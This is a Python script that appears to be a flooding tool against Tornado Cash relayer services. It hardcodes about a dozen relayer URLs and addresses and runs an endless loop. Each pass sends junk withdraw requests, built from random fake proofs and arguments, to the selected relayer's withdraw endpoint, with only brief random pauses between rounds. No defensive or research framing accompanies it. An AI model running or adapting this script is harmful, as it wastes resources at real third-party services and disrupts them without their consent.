import sys
import math

_SITES = [
        {
        "isValid": True,
        "realUrl": "http://eth.maxstorn.xyz/",
        "name": "nice-relayer.eth",
        "address": "0xb0Cdc0AB2D454F2360d4629d519819E13DBE816A",
        "relayerAddress": "0xb0Cdc0AB2D454F2360d4629d519819E13DBE816A",
        },

    {
        "isValid": True,
        "realUrl": "http://mainnet-tornado-arr-eth.crypto-bot.exchange/",
        "stakeBalance": "510000000000000000000",
        "name": "available-reliable-relayer.eth",
        "relayerAddress": "0x853281B7676DFB66B87e2f26c9cB9D10Ce883F37",
        "netId": 1,
        "ethPrices": {
            "dai": "556422614174712",
            "cdai": "12519992479499",
            "usdc": "553444131698256",
            "usdt": "556490143247241",
            "wbtc": "19315034856238970434",
            "torn": "1696788898333008"
        },
        "address": "0x853281B7676DFB66B87e2f26c9cB9D10Ce883F37",
        "currentQueue": 0,
        "tornadoServiceFee": 0.31,
        "score": "510000000000000000000"
    },
    {
        "isValid": True,
        "realUrl": "http://tornima.xyz/",
        "stakeBalance": "2449270029411120016198",
        "name": "torrelayer.eth",
        "relayerAddress": "0x2Ee39Ff05643bC7cc9ed31B71e142429044A425C",
        "netId": 1,
        "ethPrices": {
            "torn": "1696788898333008",
            "dai": "556423131723371",
            "cdai": "12520004124793",
            "usdc": "553478025873320",
            "usdt": "556572405101377",
            "wbtc": "19315034862141329140"
        },
        "address": "0x2Ee39Ff05643bC7cc9ed31B71e142429044A425C",
        "currentQueue": 0,
        "tornadoServiceFee": 0.36,
        "score": "2.394161453749369815833545e+21"
    },
    {
        "isValid": True,
        "realUrl": "http://main.gm777.xyz/",
        "stakeBalance": "4290802845654354846919",
        "name": "0xgm777.eth",
        "relayerAddress": "0x94596B6A626392F5D972D6CC4D929a42c2f0008c",
        "netId": 1,
        "ethPrices": {
            "torn": "1689423546359032",
            "dai": "598416104472725",
            "cdai": "13384388487019",
            "usdc": "599013776676721",
            "usdt": "599323410893614",
            "wbtc": "15659889148334216720"
        },
        "address": "0x94596B6A626392F5D972D6CC4D929a42c2f0008c",
        "currentQueue": 0,
        "tornadoServiceFee": 0.39,
        "score": "3.90463058954546291069629e+21"
    },
    {
        "isValid": True,
        "realUrl": "http://mainnet-tornado.cheap-relayer.xyz/",
        "stakeBalance": "3745135247314223902042",
        "name": "cheap-relayer.eth",
        "relayerAddress": "0x076D4E32C6A5D888fC4658281539c94E778C796d",
        "netId": 1,
        "ethPrices": {
            "dai": "545012483438860",
            "cdai": "12262487329106",
            "usdc": "545868692800002",
            "usdt": "545687433155476",
            "wbtc": "19185066249139314190",
            "torn": "1681263462230957"
        },
        "address": "0x076D4E32C6A5D888fC4658281539c94E778C796d",
        "currentQueue": 0,
        "tornadoServiceFee": 0.39,
        "score": "3.40807307505594375085822e+21"
    },
    {
        "isValid": True,
        "realUrl": "http://relayer.wind-egg.com/",
        "stakeBalance": "9859915766542974231958",
        "name": "default-relayer.eth",
        "relayerAddress": "0x5555555731006f71f121144534Ca7C8799F66AA3",
        "netId": 1,
        "ethPrices": {
            "dai": "545012483438860",
            "cdai": "12262487329106",
            "usdc": "545868692800002",
            "usdt": "545687433155476",
            "wbtc": "19185066249139314190",
            "torn": "1681263462230957"
        },
        "address": "0x5555555731006f71f121144534Ca7C8799F66AA3",
        "currentQueue": 0,
        "tornadoServiceFee": 0.39,
        "score": "8.97252334755410655108178e+21"
    },
    {
        "isValid": True,
        "realUrl": "http://black-hardy.com/",
        "stakeBalance": "12203802468447218633141",
        "name": "k-relayer.eth",
        "relayerAddress": "0xC49415493eB3Ec64a0F13D8AA5056f1CfC4ce35c",
        "netId": 1,
        "ethPrices": {
            "dai": "545021686572184",
            "cdai": "12262694394648",
            "usdc": "545915567890143",
            "usdt": "545692814530648",
            "wbtc": "19185066351846290978",
            "torn": "1681263462230957"
        },
        "address": "0xC49415493eB3Ec64a0F13D8AA5056f1CfC4ce35c",
        "currentQueue": 0,
        "tornadoServiceFee": 0.39,
        "score": "1.110546024628696895615831e+22"
    },
    {
        "isValid": True,
        "realUrl": "http://mainnet-tornado.low-fee.xyz/",
        "stakeBalance": "3575344746879035559326",
        "name": "lowcost.eth",
        "relayerAddress": "0x28907F21F43B419F34226d6f10aCbCf1832b1D4d",
        "netId": 1,
        "ethPrices": {
            "dai": "545012483438860",
            "cdai": "12262487329106",
            "usdc": "545868692800002",
            "usdt": "545687433155476",
            "wbtc": "19185066249139314190",
            "torn": "1681263462230957"
        },
        "address": "0x28907F21F43B419F34226d6f10aCbCf1832b1D4d",
        "currentQueue": 0,
        "tornadoServiceFee": 0.39,
        "score": "3.25356371965992235898666e+21"
    },
    {
        "isValid": True,
        "realUrl": "http://main-relayer.com/",
        "stakeBalance": "1770144100674450566168",
        "name": "main-relayer.eth",
        "relayerAddress": "0x15980A3Bd6ed317f42d2eD0DCf3d3D730b6Bc0C5",
        "netId": 1,
        "ethPrices": {
            "torn": "1681263462230957",
            "dai": "545021686572184",
            "cdai": "12262694394648",
            "usdc": "545915567890143",
            "usdt": "545692814530648",
            "wbtc": "19185066351846290978"
        },
        "address": "0x15980A3Bd6ed317f42d2eD0DCf3d3D730b6Bc0C5",
        "currentQueue": 0,
        "tornadoServiceFee": 0.4,
        "score": "1.55330144834183037181242e+21"
    },
    {
        "isValid": True,
        "realUrl": "http://torn.relayersdao.finance/",
        "stakeBalance": "15244594111376418242625",
        "name": "relayer007.eth",
        "relayerAddress": "0xa0109274F53609f6Be97ec5f3052C659AB80f012",
        "netId": 1,
        "ethPrices": {
            "torn": "1681263462230957",
            "dai": "545021686572184",
            "cdai": "12262694394648",
            "usdc": "545915567890143",
            "usdt": "545692814530648",
            "wbtc": "19185066351846290978"
        },
        "address": "0xa0109274F53609f6Be97ec5f3052C659AB80f012",
        "currentQueue": 0,
        "tornadoServiceFee": 0.39,
        "score": "1.387258064135254060078875e+22"
    },
    {
        "isValid": True,
        "realUrl": "http://eth.reltor.su/",
        "stakeBalance": "19630308431088890737610",
        "name": "reltor.eth",
        "relayerAddress": "0x4750BCfcC340AA4B31be7e71fa072716d28c29C5",
        "netId": 1,
        "ethPrices": {
            "torn": "1681263462230957",
            "dai": "545021686572184",
            "cdai": "12262694394648",
            "usdc": "545915567890143",
            "usdt": "545692814530648",
            "wbtc": "19185066351846290978"
        },
        "address": "0x4750BCfcC340AA4B31be7e71fa072716d28c29C5",
        "currentQueue": 0,
        "tornadoServiceFee": 0.39,
        "score": "1.78635806722908905712251e+22"
    },
    {
        "isValid": True,
        "realUrl": "http://eth.t-relayer.com/",
        "stakeBalance": "9501456859510021782129",
        "name": "t-relayer.eth",
        "relayerAddress": "0x000000Cd6521Ed1a65FAe0678eA15aF4EEAD74fe",
        "netId": 1,
        "ethPrices": {
            "dai": "545021686572184",
            "cdai": "12262694394648",
            "usdc": "545915567890143",
            "usdt": "545692814530648",
            "wbtc": "19185066351846290978",
            "torn": "1681263462230957"
        },
        "address": "0x000000Cd6521Ed1a65FAe0678eA15aF4EEAD74fe",
        "currentQueue": 0,
        "tornadoServiceFee": 0.39,
        "score": "8.64632574215411982173739e+21"
    },
    {
        "isValid": True,
        "realUrl": "http://torn-city.com/",
        "stakeBalance": "2901344707938224209572",
        "name": "torn-city.eth",
        "relayerAddress": "0xd04e9f0945DEA8373D882C730e2c93a74B591796",
        "netId": 1,
        "ethPrices": {
            "torn": "1681263462230957",
            "dai": "545021948308738",
            "cdai": "12262700283580",
            "usdc": "545916900682296",
            "usdt": "545692967577715",
            "wbtc": "19185066354767300990"
        },
        "address": "0xd04e9f0945DEA8373D882C730e2c93a74B591796",
        "currentQueue": 0,
        "tornadoServiceFee": 0.39,
        "score": "2.64022368422378403071052e+21"
    }
]

import os
import aiohttp
import asyncio
import time
import random


def random_contract():
    x = ['0x12D66f87A04A9E220743712cE6d9bB1B5616B8Fc',
         '0x47CE0C6eD5B0Ce3d3A51fdb1C52DC66a7c3c2936',
         '0x910Cbd523D972eb0a6f4cAe4618aD62622b39DbF',
         '0xA160cdAB225685dA1d56aa342Ad8841c3b53f291']
    return random.choice(x)

def random_hex(size):
    return os.urandom(size).hex()

def random_withdraw(item):
    input_data = {
        "proof": "0x"+random_hex(256),
        "contract": random_contract(),
        "args": [
            "0x"+random_hex(32),
            "0x"+random_hex(32),
            "0x"+random_hex(20),
            item.get("address"),
            "0x"+random_hex(32),
            "0x"+random_hex(32)
        ]
    }
    return input_data

async def fetch_data(session, item):
    url = item.get("realUrl") + "v1/tornadoWithdraw"
    print(url)
    async with session.post(url, json=random_withdraw(item)) as response:
        return await response.text()

async def main(item):
    num_requests = math.ceil(2 * random.random()) 
    print(item.get("name"), item.get("address"), num_requests)
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_data(session, item) for _ in range(num_requests)]
        responses = await asyncio.gather(*tasks)
        # You can process the responses here if needed
        for response in responses:
             print(".")

def gan_ta(item):
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main(item))
    return

if __name__ == "__main__":
    _round = 0
    _item = _SITES[int(sys.argv[1])]
    while True:
        try:
            gan_ta(_item)
        except Exception as e:
            print("Meet: ", e)
        print("Total: %s, Index: %s, Round: %s " % (len(_SITES), sys.argv[1], _round))
        _round += 1
        time.sleep(0.6 * random.random())
